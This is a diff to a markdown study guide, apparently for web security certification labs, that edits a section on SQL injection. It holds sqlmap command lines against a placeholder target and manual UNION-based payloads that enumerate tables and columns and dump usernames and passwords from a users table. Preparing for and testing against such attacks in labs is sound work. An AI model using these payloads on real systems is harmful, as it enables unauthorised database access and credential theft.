@@ -1296,7 +1296,7 @@ csrf=TOKEN&username=administrator
 [Blind SQLi Conditional Response](#blind-sqli-conditional-response)  
 [Oracle](#oracle)  
 [SQLMAP](#sqlmap)  
-[Manual SQLi](#manual-sqli)  
+[Non-Oracle Manual SQLi](#non-oracle-manual-sqli)  
   
 >Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
 
@@ -1436,7 +1436,7 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cook
 sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
 ```  
 
-### Manual SQLi  
+### Non-Oracle Manual SQLi  
 
 >SQL injection UNION attack, determining the **number of columns** returned by the query.  
 
@@ -1444,21 +1444,21 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flus
 '+UNION+SELECT+NULL,NULL--
 ```  
 
->Finding a column containing text, to be used for reflecting information extracted.  
+>Determined there is **two** columns returned. Finding a column containing ```text```, to be used for reflecting information extracted.  
 
 ```
-'+UNION+SELECT+'abcdef',NULL,NULL--
+'+UNION+SELECT+'fuzzer',NULL--
 ```  
 
->SQL injection vulnerability exploited manually by identifying a list of **tables** in the database.  
+>Next identifying a list of **tables** in the database.  
 
 ```SQL
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
 ```  
 
->Retrieving data from other tables, sample is below payload to retrieve the contents of the users table.  
+>**OPTIONAL:** Retrieve data from other tables, use code below payload to retrieve the contents of the ```users``` table.  
 
-```
+```sql
 '+UNION+SELECT+username,+password+FROM+users--
 ```  
 
@@ -1468,16 +1468,16 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flus
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_XXXX'--
 ```  
   
->Retrieving multiple values in a single column able to reflect text.  
+>**Final** step is to the **dump data** from the username and passwords columns.  
+
+```SQL
+'+UNION+SELECT+username_XXXX,+password_XXXX+FROM+users_XXXX--
+```  
+
+>**EXTRA:** If only have one column to extract data, then concatenate multiple values in a single reflected output field using SQL syntax ```||``` characters.  
 
 ```
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
-```  
-
->Final step **dump data** from the username and passwords columns.  
-
-```SQL
-'+UNION+SELECT+username_XXX,+password_XXX+FROM+users_XXXX--
 ```  
 
 ![manual-sqli.png](images/manual-sqli.png)  
